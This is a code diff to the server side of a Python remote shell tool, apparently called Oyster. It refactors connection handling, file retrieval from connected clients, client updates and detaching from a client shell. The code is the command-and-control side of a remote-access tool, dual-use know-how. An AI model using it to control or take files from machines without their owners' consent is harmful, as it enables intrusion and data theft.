@@ -145,9 +145,14 @@ class ConnectionManager(object):
         c = 0
         client_data = "-------------- Clients --------------\n"
         for key, connection in self.connections.items():
-            client_data += '[{}]'.format(c) + '   ' + key + '   ' + str(connection.port)
+            client_data += '[{}]'.format(c) + '   ' + key + '   ' + str(connection.port) + '\n'
             c += 1
         return client_data
+
+    def close(self):
+        if self.current_connection is not None:
+            self.current_connection.close()
+        return self
 
     def use_connection(self, ip):
         """
@@ -183,6 +188,17 @@ class ConnectionManager(object):
                 print('No connection for the given IP address')
                 return None
         return self.current_connection
+
+    def remove_connection(self, connection):
+        ip = False
+        for ip, conn in self.connections.items():
+            if conn == connection:
+                ip = ip
+                break
+        if ip:
+            print('< Removing connection: {} >'.format(ip))
+            del self.connections[ip]
+        return self
 
     def send_command(self, command, echo=False, encode=True):
         """
@@ -361,8 +377,8 @@ o       O o   O `Ooo.   O   OooO'  o
                 # Loop indefinitely
                 continue
 
-            if address[0] in self.connection_mgr.connections.keys():
-                continue
+            # if address[0] in self.connection_mgr.connections.keys():
+            #     continue
 
             conn_obj = Connection(conn, address, recv_size=self.recv_size)
             should_connect = conn_obj.send_command('connect {}'.format(self.connection_mgr.session_id))
@@ -379,7 +395,14 @@ o       O o   O `Ooo.   O   OooO'  o
                     print('< Listener Thread > Connections no longer being accepted!')
                     break
 
-            print('\n< Listener Thread > {} ({}) connected...\n{}'.format(address[0], address[1], 'Oyster> '), end='')
+            print(
+                '\n< Listener Thread > {} ({}) connected...\n{}'.format(
+                    address[0],
+                    address[1],
+                    'Oyster> '
+                ),
+                end=''
+            )
         return
 
     def update_clients(self):
@@ -398,7 +421,9 @@ o       O o   O `Ooo.   O   OooO'  o
             _c = "update {}".format(file_data)
             print(self.connection_mgr.send_commands(_c))
         sleep(.5)
-
+        self.connection_mgr.close()
+        self.connection_mgr.remove_connection(self.connection_mgr.current_connection)
+        self.connection_mgr.current_connection = None
         print('Finished uploading \'update.py\' to client.')
         return self
 
@@ -470,18 +495,20 @@ o       O o   O `Ooo.   O   OooO'  o
         # print('\n<', filepath, 'written...', '>')
         return
 
-    def get_file(self, filepath):
+    def get_file(self, filepaths):
         """
         Get a file from the server.
 
-        :param filepath:
+        :param filepaths:
         :return:
         """
 
-        filedata = self.connection_mgr.send_command('get {}'.format(filepath))
-        local_filepath = expanduser(input('< Local File Path > '))
+        remote_filepath, local_filepath = shlex.split(filepaths)
+
+        filedata = self.connection_mgr.send_command('get {}'.format(remote_filepath))
         t = threading.Thread(target=self.write_file_data, args=(local_filepath, filedata))
         t.start()
+        print('< File Stashed: {} >'.format(local_filepath))
         return
 
     def client_shell(self):
@@ -497,15 +524,19 @@ o       O o   O `Ooo.   O   OooO'  o
             if command == 'quit' or command == 'exit':
                 print('Detaching from client...')
                 try:
-                    self.connection_mgr.send_command('quit')
+                    self.connection_mgr.close()
                 except (BrokenPipeError, OSError) as err_msg:
-                    pass
+                    self.connection_mgr.remove_connection(self.connection_mgr.current_connection)
+                    self.connection_mgr.current_connection = None
+                    break
+
+                self.connection_mgr.remove_connection(self.connection_mgr.current_connection)
                 self.connection_mgr.current_connection = None
                 break
 
             if command[:4] == 'get ':
-                filepath = command[4:]
-                self.get_file(filepath)
+                filepaths = command[4:]
+                self.get_file(filepaths)
                 continue
 
             if command[:7] == 'upload ':
